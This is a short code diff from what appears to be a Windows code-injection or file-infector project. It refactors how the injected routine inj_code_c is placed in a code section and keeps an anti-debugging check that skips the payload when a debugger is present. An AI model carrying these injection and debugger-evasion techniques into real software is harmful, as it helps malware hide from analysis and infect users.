@@ -1,5 +1,6 @@
 #include "payload.h"
 #include <Windows.h>
+#include "injected.h"
 #include "libproc.hpp"
 #include "utils.h"
 
@@ -13,7 +14,7 @@ extern CONST DWORD signature;
 #endif  // SKIP_SIGN
 EXTERN_C_END
 
-__declspec(code_seg("injected")) VOID inj_code_c() {
+INJECTED_CODE VOID inj_code_c() {
 #ifndef NO_ANTIDBG
     if (being_debugged()) {
         // If we're being debugged, do not run the payload, just run the program normally
